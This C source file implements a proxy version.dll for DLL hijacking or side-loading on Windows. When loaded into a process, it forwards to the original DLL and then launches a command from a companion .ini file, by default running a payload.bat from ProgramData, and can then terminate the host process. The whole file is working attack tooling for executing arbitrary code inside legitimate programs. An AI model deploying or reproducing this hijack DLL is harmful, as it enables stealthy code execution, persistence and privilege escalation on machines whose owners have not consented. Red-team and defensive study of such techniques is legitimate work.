#include <windows.h>

#include "versiondll_payload.h"

#define COMMAND_MAX_SIZE 2048

static WCHAR command[COMMAND_MAX_SIZE] = { 0 };

BOOL RunPayload(HMODULE selfdll)
{
    PROCESS_INFORMATION pi = { 0 };
    STARTUPINFOW si = { 0 };
    UINT exitafterrun = 0;
    WCHAR inipath[MAX_PATH * 2] = { 0 };
    
    if (GetModuleFileNameW(selfdll, inipath, MAX_PATH * 2 - 4))
    {
        wcscat_s(inipath, MAX_PATH * 2, L".ini");
        exitafterrun = GetPrivateProfileIntW(L"Payload", L"ExitAfterRun", 0, inipath);
        GetPrivateProfileStringW(L"Payload", L"Command", L"cmd.exe /c %PROGRAMDATA%\\payload.bat", command, COMMAND_MAX_SIZE, inipath);

        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_FORCEOFFFEEDBACK;
        si.wShowWindow = SW_SHOWDEFAULT;
        if (CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
        {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            if (exitafterrun)
            {
                ExitProcess(0);
            }
            return TRUE;
        }
    }
    return FALSE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        LoadOrgVersionDll();
        RunPayload(hModule);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        FreeOrgVersionDll();
        break;
    }
    return TRUE;
}
